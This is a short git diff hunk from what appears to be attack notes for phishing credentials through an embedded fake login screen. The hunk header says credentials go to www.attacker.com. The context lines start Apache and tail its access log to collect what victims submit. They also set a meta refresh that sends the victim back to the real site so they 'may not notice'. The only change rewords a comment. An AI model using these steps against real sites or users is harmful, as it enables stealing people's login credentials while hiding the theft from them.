@@ -47,7 +47,7 @@ Submits credentials to the www.attacker.com (Embeds Login Screen inside applicat
 # service apache2 start 
 # tail -f /var/log/access.log
 
-# Gets stuck on attackers page, do this to resolve issue, victim may not notice the redirect :)
+# Gets stuck on attackers page, do the following to resolve issue, victim may not notice the redirect :)
 # In Apache, edit index.html to look like this 
 # <meta http-equiv="refresh" content="0;url=https://victims.website.com/link-they-started-on/">
 
